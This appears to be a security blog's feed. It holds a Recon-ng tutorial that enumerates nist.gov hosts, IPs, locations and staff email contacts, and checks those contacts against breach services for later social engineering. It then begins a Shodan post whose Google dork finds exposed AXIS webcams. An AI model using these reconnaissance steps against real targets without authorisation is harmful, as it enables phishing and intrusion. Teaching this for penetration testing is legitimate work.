&lt;p&gt;Recon-ng is an incredibly powerful tool for Open Source Intelligence Gathering (OSINT); actually, it is a reconnaissance framework written in Python built with a Metasploit like usage model (we will see what Metasploit is further on, for now it is enough to know that it is the most famous penetration testing framework).&lt;br /&gt;
&lt;!--more--&gt;
Reconnaissance is considered as the activity of acquiring open source informations, i.e. available on the Internet, about a target in a passive way (passive reconnaissance); conversely, discovery is the activity which permits to acquire informations by sending packets directly to the target (active reconnaissance). Even if Recon-ng is mainly a passive reconnaissance framework, it includes also some elements for discovery and exploitation.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Since we will use a lot of tools during the next posts, I highly suggest to set up a Virtual Machine with a Penetration Testing distribution installed on.
Personally I use VMware Workstation 12 Player as hypervisor for server and desktop virtualization which is free and can be downloaded from the official website. Regarding operating systems, I use mainly Kali Linux, which is a Debian based distribution. This distro is very useful because it has a pretty good number of tools preinstalled and preconfigured leaving to the user a ready to use PT machine. I will not explain how to set up a VM since you can find a lot of tutorials about that on the web.&lt;/p&gt;

&lt;p&gt;Anyway, you can still download Recon-ng on your favorite Linux distribution from author repository using &lt;code class=&quot;highlighter-rouge&quot;&gt;git clone&lt;/code&gt; and installing required dependencies (this is also an option in Kali Linux in case you want the latest version available): &lt;a href=&quot;https://bitbucket.org/LaNMaSteR53/recon-ng&quot;&gt;https://bitbucket.org/LaNMaSteR53/recon-ng&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In Kali Linux, we can start Recon-ng in different ways. One is by navigating in the applications menu by clicking on &lt;em&gt;Applications &amp;gt;  Information Gathering &amp;gt; recon-ng&lt;/em&gt; like shown in the following image:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/recon-ng/recon-ng_start.png&quot;&gt;&lt;img src=&quot;/images/recon-ng/recon-ng_start.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Same thing can be done by clicking on the “Show application” menu:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/recon-ng/recon-ng_start2.png&quot;&gt;&lt;img src=&quot;/images/recon-ng/recon-ng_start2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Another possibility is launching it by simply opening the Terminal and typing &lt;code class=&quot;highlighter-rouge&quot;&gt;recon-ng&lt;/code&gt;. In any case, we are prompted with the framework banner, version and number of modules for each category:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/recon-ng/recon-ng_intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Modules are the core of the framework and in the current version there are five categories:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Recon modules - for reconnaissance activities;&lt;/li&gt;
  &lt;li&gt;Reporting modules - for reporting results on a file;&lt;/li&gt;
  &lt;li&gt;Import modules - for importing values from a file into a database table;&lt;/li&gt;
  &lt;li&gt;Exploitation modules - for explotation activities;&lt;/li&gt;
  &lt;li&gt;Discovery modules - for discovery activities.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The good thing is that everyone can implement his own module written in Python and integrate it inside the framework.&lt;br /&gt;
Since we are dealing with information gathering, we will focus on recon modules.&lt;br /&gt;
The framework accepts commands via command line; to have a list of the commands just type &lt;code class=&quot;highlighter-rouge&quot;&gt;help&lt;/code&gt; and press enter:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][default] &amp;gt; help

Commands (type [help|?] &amp;lt;topic&amp;gt;):
---------------------------------
add             Adds records to the database
back            Exits the current context
delete          Deletes records from the database
exit            Exits the framework
help            Displays this menu
keys            Manages framework API keys
load            Loads specified module
pdb             Starts a Python Debugger session
query           Queries the database
record          Records commands to a resource file
reload          Reloads all modules
resource        Executes commands from a resource file
search          Searches available modules
set             Sets module options
shell           Executes shell commands
show            Shows various framework items
snapshots       Manages workspace snapshots
spool           Spools output to a file
unset           Unsets module options
use             Loads specified module
workspaces      Manages workspaces
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;To display a list of all available modules for each category we can use the &lt;code class=&quot;highlighter-rouge&quot;&gt;show&lt;/code&gt; command:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;show modules
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Since right now we are only interested in recon modules, we can limit the search to them:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][default] &amp;gt; show modules recon

  Recon
  -----
    recon/companies-contacts/bing_linkedin_cache
    recon/companies-contacts/indeed
    recon/companies-contacts/jigsaw/point_usage
    recon/companies-contacts/jigsaw/purchase_contact
    recon/companies-contacts/jigsaw/search_contacts
    recon/companies-contacts/linkedin_auth
    recon/companies-multi/github_miner
    recon/companies-multi/whois_miner
    recon/contacts-contacts/mailtester
    recon/contacts-contacts/mangle
    recon/contacts-contacts/unmangle
    recon/contacts-credentials/hibp_breach
    recon/contacts-credentials/hibp_paste
    recon/contacts-domains/migrate_contacts
    recon/contacts-profiles/fullcontact
    recon/credentials-credentials/adobe
    recon/credentials-credentials/bozocrack
    recon/credentials-credentials/hashes_org
    recon/domains-contacts/metacrawler
    recon/domains-contacts/pgp_search
    recon/domains-contacts/whois_pocs
    recon/domains-credentials/pwnedlist/account_creds
    recon/domains-credentials/pwnedlist/api_usage
    recon/domains-credentials/pwnedlist/domain_creds
    recon/domains-credentials/pwnedlist/domain_ispwned
    recon/domains-credentials/pwnedlist/leak_lookup
    recon/domains-credentials/pwnedlist/leaks_dump
    recon/domains-domains/brute_suffix
    recon/domains-hosts/bing_domain_api
    recon/domains-hosts/bing_domain_web
    recon/domains-hosts/brute_hosts
    recon/domains-hosts/builtwith
    recon/domains-hosts/google_site_api
    recon/domains-hosts/google_site_web
    ...................................

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The structure for each module is the following:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;module-category/data-conversion/module-name
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Consider, for example, &lt;code class=&quot;highlighter-rouge&quot;&gt;recon/domains-hosts/google_site_web&lt;/code&gt;: this performs a recon activity using Google Search Engine to convert an information about a domain into data about hosts of that domain. Keep in mind that certain modules require valid API key to run; some keys can be acquired by simply registering on the related website.&lt;br /&gt;
To select a module we need the &lt;code class=&quot;highlighter-rouge&quot;&gt;use&lt;/code&gt; command:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use recon/domains-hosts/google_site_web
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Once the module is selected we can show informations about it:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][default][google_site_web] &amp;gt; show info

      Name: Google Hostname Enumerator
      Path: modules/recon/domains-hosts/google_site_web.py
    Author: Tim Tomes (@LaNMaSteR53)

Description:
  Harvests hosts from Google.com by using the &#39;site&#39; search operator. Updates the &#39;hosts&#39; table with
  the results.

Options:
  Name    Current Value  Required  Description
  ------  -------------  --------  -----------
  SOURCE  default        yes       source of input (see &#39;show info&#39; for details)

Source Options:
  default        SELECT DISTINCT domain FROM domains WHERE domain IS NOT NULL
  &amp;lt;string&amp;gt;       string representing a single input
  &amp;lt;path&amp;gt;         path to a file containing a list of inputs
  query &amp;lt;sql&amp;gt;    database query returning one column of inputs
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In this way we can read the description and take a look at the options we can set before running the recon activity. As you can see, the action performed by this module is pretty the same as the one explained in the article &lt;a href=&quot;https://spreadsecurity.github.io/2016/07/18/information-gathering-with-google-search-engine.html&quot; target=&quot;_blank&quot;&gt;Information gathering with Google Search Engine&lt;/a&gt;, but this time it is done in an automated way.&lt;br /&gt;
In case we want to analyze module source code we can either use &lt;code class=&quot;highlighter-rouge&quot;&gt;show source&lt;/code&gt; or navigate to &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/recon-ng/modules/recon/domains-hosts&lt;/code&gt; where the python file &lt;code class=&quot;highlighter-rouge&quot;&gt;google_site_web.py&lt;/code&gt; is located (note that folders structure reflects modules categories and data conversions).&lt;br /&gt;
Once all required options are set up through &lt;code class=&quot;highlighter-rouge&quot;&gt;set&lt;/code&gt; command, the module can be executed with &lt;code class=&quot;highlighter-rouge&quot;&gt;run&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We will see now an example of reconnaissance activity performed on the National Institute of Standards and Technology (NIST) domain.&lt;br /&gt;
Before starting, we need to introduce the concept of workspace: Recon-ng allows to define a workspace for each target subject of reconnaissance; by doing this, it will create a database containing all gathered informations about the target itself. This is the reason why in the “framework help” shown before there is the &lt;code class=&quot;highlighter-rouge&quot;&gt;query&lt;/code&gt; command, which allows to examine the DB using Standard Query Language (SQL), and also why import modules are present.&lt;/p&gt;

&lt;p&gt;We start by creating a new workspace:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;workspaces add NIST
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;After that, the command line shows the change from the default workspace to the new one.
Then we need to associate a domain with the created workspace and finally we can check that everything is set up correctly by listing domains with &lt;code class=&quot;highlighter-rouge&quot;&gt;show&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][default] &amp;gt; workspaces add NIST
[recon-ng][NIST] &amp;gt; add domains nist.gov
[recon-ng][NIST] &amp;gt; show domains

  +---------------------------------+
  | rowid |  domain  |    module    |
  +---------------------------------+
  | 1     | nist.gov | user_defined |
  +---------------------------------+

[*] 1 rows returned
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Same result can be obtained with:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST] &amp;gt; query select * from domains
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This can be checked also by querying the database with an external tool; the DB is located in the following folder:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~/.recon-ng/workspaces/NIST
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Here there is a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;data.db&lt;/code&gt; which is the database for NIST workspace; to explore the DB we can use the tool &lt;code class=&quot;highlighter-rouge&quot;&gt;sqlite3&lt;/code&gt; already installed in Kali Linux:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/.recon-ng/workspaces/NIST# sqlite3 data.db 
SQLite version 3.13.0 2016-05-18 10:57:30
Enter &quot;.help&quot; for usage hints.
sqlite&amp;gt; select * from domains;
nist.gov|user_defined
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;To exit from the program, just type &lt;code class=&quot;highlighter-rouge&quot;&gt;.exit&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We can also add a company name:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST] &amp;gt; add companies
company (TEXT): NIST
description (TEXT): National Institute of Standards and Technology
[recon-ng][NIST] &amp;gt; show companies

  +---------------------------------------------------------------------------------+
  | rowid | company |                  description                   |    module    |
  +---------------------------------------------------------------------------------+
  | 1     | NIST    | National Institute of Standards and Technology | user_defined |
  +---------------------------------------------------------------------------------+

[*] 1 rows returned
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Adding domains and companies is the initial step because they are inputs used by modules to perform information gathering. To check all modules using these two informations as a starting point we can leverage the &lt;code class=&quot;highlighter-rouge&quot;&gt;search&lt;/code&gt; command:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST] &amp;gt; search domains-
[*] Searching for &#39;domains-&#39;...

  Recon
  -----
    recon/domains-contacts/metacrawler
    recon/domains-contacts/pgp_search
    recon/domains-contacts/whois_pocs
    recon/domains-credentials/pwnedlist/account_creds
    recon/domains-credentials/pwnedlist/api_usage
    recon/domains-credentials/pwnedlist/domain_creds
    recon/domains-credentials/pwnedlist/domain_ispwned
    recon/domains-credentials/pwnedlist/leak_lookup
    recon/domains-credentials/pwnedlist/leaks_dump
    recon/domains-domains/brute_suffix
    recon/domains-hosts/bing_domain_api
    recon/domains-hosts/bing_domain_web
    recon/domains-hosts/brute_hosts
    recon/domains-hosts/builtwith
    recon/domains-hosts/google_site_api
    recon/domains-hosts/google_site_web
    recon/domains-hosts/hackertarget
    recon/domains-hosts/netcraft
    recon/domains-hosts/shodan_hostname
    recon/domains-hosts/ssl_san
    recon/domains-hosts/vpnhunter
    recon/domains-vulnerabilities/ghdb
    recon/domains-vulnerabilities/punkspider
    recon/domains-vulnerabilities/xssed
    recon/domains-vulnerabilities/xssposed

[recon-ng][NIST] &amp;gt; search companies-
[*] Searching for &#39;companies-&#39;...

  Recon
  -----
    recon/companies-contacts/bing_linkedin_cache
    recon/companies-contacts/indeed
    recon/companies-contacts/jigsaw/point_usage
    recon/companies-contacts/jigsaw/purchase_contact
    recon/companies-contacts/jigsaw/search_contacts
    recon/companies-contacts/linkedin_auth
    recon/companies-multi/github_miner
    recon/companies-multi/whois_miner

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Suppose we want to start populating our DB with hostnames related to &lt;em&gt;nist.gov&lt;/em&gt; domain usign &lt;code class=&quot;highlighter-rouge&quot;&gt;google_site_web&lt;/code&gt; module seen before; to check parameters required to run it we can display module options:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST][google_site_web] &amp;gt; show options

  Name    Current Value  Required  Description
  ------  -------------  --------  -----------
  SOURCE  default        yes       source of input (see &#39;show info&#39; for details)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Since we have already set the domain, the “Current Value” which says “default” is taken directly from the DB. Then, we can just run the module and after a little while we get the results:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST][google_site_web] &amp;gt; run

--------
NIST.GOV
--------
[*] Searching Google for: site:nist.gov
[*] [host] www.nsrl.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] gams.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] physics.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] face.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] scap.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] patapsco.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] nvd.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] kinetics.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] srdata.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] www.cftt.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] cccbdb.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] museum.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] thermosymposium.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] www.atp.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] www.ctcms.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] usgcb.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] www.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] trecvid.nist.gov (&amp;lt;blank&amp;gt;)
[*] [host] stonewall.nist.gov (&amp;lt;blank&amp;gt;)
.......................................
-------
SUMMARY
-------
[*] 73 total (73 new) hosts found.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In this case we discovered 73 hosts related to the domain; we can show the list of discovered host:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST][google_site_web] &amp;gt; show hosts

  +-----------------------------------------------------------------------------------------------------------------+
  | rowid |              host              | ip_address | region | country | latitude | longitude |      module     |
  +-----------------------------------------------------------------------------------------------------------------+
  | 1     | www.nsrl.nist.gov              |            |        |         |          |           | google_site_web |
  | 2     | gams.nist.gov                  |            |        |         |          |           | google_site_web |
  | 3     | physics.nist.gov               |            |        |         |          |           | google_site_web |
  | 4     | face.nist.gov                  |            |        |         |          |           | google_site_web |
  | 5     | scap.nist.gov                  |            |        |         |          |           | google_site_web |
  | 6     | patapsco.nist.gov              |            |        |         |          |           | google_site_web |
  | 7     | nvd.nist.gov                   |            |        |         |          |           | google_site_web |
  | 8     | kinetics.nist.gov              |            |        |         |          |           | google_site_web |
  | 9     | srdata.nist.gov                |            |        |         |          |           | google_site_web |
  | 10    | www.cftt.nist.gov              |            |        |         |          |           | google_site_web |
  | 11    | cccbdb.nist.gov                |            |        |         |          |           | google_site_web |
  | 12    | museum.nist.gov                |            |        |         |          |           | google_site_web |
  | 13    | thermosymposium.nist.gov       |            |        |         |          |           | google_site_web |
  | 14    | www.atp.nist.gov               |            |        |         |          |           | google_site_web |
  | 15    | www.ctcms.nist.gov             |            |        |         |          |           | google_site_web |
  | 16    | usgcb.nist.gov                 |            |        |         |          |           | google_site_web |
  | 17    | www.nist.gov                   |            |        |         |          |           | google_site_web |
  | 18    | trecvid.nist.gov               |            |        |         |          |           | google_site_web |
  | 19    | stonewall.nist.gov             |            |        |         |          |           | google_site_web |
.....................................................................................................................
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;As the table shows, we have empty columns ready to store additional informations for each host: these can be populated by hand or by running other modules using host informations we just gathered:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST][google_site_web] &amp;gt; search hosts-
[*] Searching for &#39;hosts-&#39;...

  Recon
  -----
    recon/hosts-domains/migrate_hosts
    recon/hosts-hosts/bing_ip
    recon/hosts-hosts/freegeoip
    recon/hosts-hosts/ipinfodb
    recon/hosts-hosts/resolve
    recon/hosts-hosts/reverse_resolve
    recon/hosts-hosts/ssltools
    recon/hosts-locations/migrate_hosts
    recon/hosts-ports/shodan_ip
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We can find IP addresses for each host by running &lt;code class=&quot;highlighter-rouge&quot;&gt;recon/hosts-hosts/resolve&lt;/code&gt; module, while the geolocation can be acquired with &lt;code class=&quot;highlighter-rouge&quot;&gt;recon/hosts-hosts/freegeoip&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST][freegeoip] &amp;gt; show hosts 

  +------------------------------------------------------------------------------------------------------------------------------------------+
  | rowid |              host              |   ip_address  |         region         |    country    | latitude | longitude |      module     |
  +------------------------------------------------------------------------------------------------------------------------------------------+
  | 1     | www.nsrl.nist.gov              | 129.6.24.57   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 2     | gams.nist.gov                  | 129.6.24.27   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 3     | physics.nist.gov               | 129.6.13.152  | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 4     | face.nist.gov                  | 132.163.4.217 | Boulder, Colorado      | United States | 39.9668  | -105.2092 | google_site_web |
  | 5     | scap.nist.gov                  | 129.6.13.177  | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 6     | patapsco.nist.gov              | 129.6.13.93   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 7     | nvd.nist.gov                   | 129.6.13.177  | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 8     | kinetics.nist.gov              | 129.6.24.48   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 9     | srdata.nist.gov                | 129.6.13.111  | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 10    | www.cftt.nist.gov              | 129.6.24.57   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 11    | cccbdb.nist.gov                | 129.6.13.59   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 12    | museum.nist.gov                | 129.6.13.111  | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 13    | thermosymposium.nist.gov       | 132.163.4.124 | Boulder, Colorado      | United States | 39.9668  | -105.2092 | google_site_web |
  | 14    | www.atp.nist.gov               | 132.163.4.217 | Boulder, Colorado      | United States | 39.9668  | -105.2092 | google_site_web |
  | 15    | www.ctcms.nist.gov             | 129.6.24.51   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 16    | usgcb.nist.gov                 | 129.6.13.177  | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
  | 17    | www.nist.gov                   | 132.163.4.18  | Boulder, Colorado      | United States | 39.9668  | -105.2092 | google_site_web |
  | 18    | trecvid.nist.gov               | 132.163.4.217 | Boulder, Colorado      | United States | 39.9668  | -105.2092 | google_site_web |
  | 19    | stonewall.nist.gov             | 129.6.13.93   | Gaithersburg, Maryland | United States | 39.1403  | -77.222   | google_site_web |
..............................................................................................................................................
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;As shown, in minutes we have acquired tons of informations about target hosts.&lt;br /&gt;
Now we can lower the search level by digging even deeper: what about looking for contact informations such as names and email addresses?
We can achieve this objective by running &lt;code class=&quot;highlighter-rouge&quot;&gt;recon/domains-contacts/pgp_search&lt;/code&gt;: in fact as the description reports, this module searches the MIT public PGP key server for email addresses of the given domain. After module has been executed, we can display results stored in the DB (of course names and addresses in the following table are fictional for privacy reasons):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST][pgp_search] &amp;gt; show contacts

  +----------------------------------------------------------------------------------------------------------------------------------------------+
  | rowid |   first_name  | middle_name |    last_name     |             email             |        title        | region | country |   module   |
  +----------------------------------------------------------------------------------------------------------------------------------------------+
  | 1     | Bugs          |             | Bunny            | bugs.bunny@nist.gov           | PGP key association |        |         | pgp_search |
  | 2     | Foghorn       |             | Leghorn          | foghorn.leghorn@nist.gov      | PGP key association |        |         | pgp_search |
  | 3     | Daffy         |             | Duck             | daffy.duck@nist.gov           | PGP key association |        |         | pgp_search |

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This is not over yet: we can also search if those contacts have been involved in a databreach, like Adobe one in 2013. For this purpose there are two interesting modules, &lt;code class=&quot;highlighter-rouge&quot;&gt;recon/contacts-credentials/hibp_breach&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;recon/contacts-credentials/hibp_paste&lt;/code&gt;: the first one leverages haveibeenpwned.com API to determine if email addresses are associated with breached credentials, while the other one uses the API to determine if email addresses have been published to various paste sites.&lt;/p&gt;

&lt;p&gt;You can check if your email address has been compromised in data breaches by simply going on the &lt;em&gt;Have I Been Pwned?&lt;/em&gt; (HIBP) website and launching a search. This service collects and analyzes database dumps and pastes leaked by data breaches happened over the years regarding millions of accounts.&lt;/p&gt;

&lt;p&gt;All these informations can be useful during next phases of the attack, especially for Social Engineering (we will look into this technique in future articles).&lt;/p&gt;

&lt;p&gt;Once collected enough informations, it is useful to report them in a document. Fortunately, Recon-ng offers modules to report results in different formats:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST] &amp;gt; show modules reporting

  Reporting
  ---------
    reporting/csv
    reporting/html
    reporting/json
    reporting/list
    reporting/pushpin
    reporting/xlsx
    reporting/xml
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;For example, we can choose to save the returns in an HTML page file:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[recon-ng][NIST] &amp;gt; use reporting/html
[recon-ng][NIST][html] &amp;gt; show options

  Name      Current Value                                 Required  Description
  --------  -------------                                 --------  -----------
  CREATOR                                                 yes       creator name for the report footer
  CUSTOMER                                                yes       customer name for the report header
  FILENAME  /root/.recon-ng/workspaces/NIST/results.html  yes       path and filename for report output
  SANITIZE  True                                          yes       mask sensitive data in the report

[recon-ng][NIST][html] &amp;gt; set CREATOR Spread Security
CREATOR =&amp;gt; Spread Security
[recon-ng][NIST][html] &amp;gt; set CUSTOMER NIST
CUSTOMER =&amp;gt; NIST
[recon-ng][NIST][html] &amp;gt; run
[*] Report generated at &#39;/root/.recon-ng/workspaces/NIST/results.html&#39;.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Results can be then visualized using a common web browser:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/recon-ng/recon-ng_report.png&quot;&gt;&lt;img src=&quot;/images/recon-ng/recon-ng_report.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusions&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Recon-ng is a valuable framework for reconnaissance which has a really good system for storing and managing data for later use.&lt;br /&gt;
We have seen only a small part of its real capabilities, so take your time to explore and experiment with it to take advantage of its true power.&lt;/p&gt;
</description>
        <pubDate>Mon, 01 Aug 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/08/01/open-source-web-reconnaissance-with-recon-ng.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/08/01/open-source-web-reconnaissance-with-recon-ng.html</guid>
        
        <category>Information gathering</category>
        
        <category>OSINT</category>
        
        <category>Recon-ng</category>
        
        
      </item>
    
      <item>
        <title>Information Gathering with Shodan</title>
        <description>&lt;p&gt;Today a large number of devices are connected to Internet, from smartphones or watches to air-conditioning devices or even refrigerators: this is what has been called “Internet of Things” (IoT), i.e. the network composed by physical devices collecting and exchanging data between themselves.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/shodan/IoT.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Of course, a wrong configuration of these devices can generate serious problems in terms of privacy.&lt;br /&gt;
The simplest example is given by private webcams, or better what they are intended to be: in fact, if they are set to have a public IP address and have not been secured properly, they can be accessed from anywhere in the world by anyone.&lt;br /&gt;
Moreover, even if configured to request login credentials, many of them still have default access values, which can be easily acquired by reading user manual.&lt;br /&gt;
Generally, depending from the webcam model, the web control interface has a default page title and a defined pattern in the url used for browser access (the only difference will be the IP address). So, once we know the title or the url pattern for a specific model, we can generate a Google query to search all the devices of that type exposed on the Internet with the same technique used in the previous article.&lt;br /&gt;
An example is given by this simple query which exploits the web console interface title:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;intitle:&quot;Live View / - AXIS&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In this way we can find all webcams from AXIS manufacturer with a public IP address indexed by Google.&lt;/p&gt;

&lt;p&gt;However, there is a really powerful search engine for the IoT called &lt;em&gt;Shodan&lt;/em&gt; that makes all the hard work for us: https://www.shodan.io&lt;/p&gt;

&lt;p&gt;&lt;b&gt;The search engine for the Internet of Things&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;The description in the website says that Shodan is the world’s first search engine for Internet-connected devices:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/shodan/shodan.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here it is possible to look for industrial control systems, databases, video games servers, routers, webcams, refrigerators and so on; in fact, mainly using banner grabbing technique by interrogating ports, Shodan is able to discover a lot of informations about publicly exposed devices. This is the big difference between Google and Shodan: while the first one crawls for data on web pages, the latter probes for ports and captures resulting banners.&lt;/p&gt;

&lt;p&gt;We can either use directly the search form or use the Explore button for a guided search through the available categories using predefined queries.
I highly suggest to register to the site in order to gain access to features like &lt;em&gt;filters&lt;/em&gt; and &lt;em&gt;reports&lt;/em&gt; (including the API key).&lt;/p&gt;

&lt;p&gt;Suppose we want to search for AXIS devices, we compile the search form and launch the query:&lt;/p&gt;

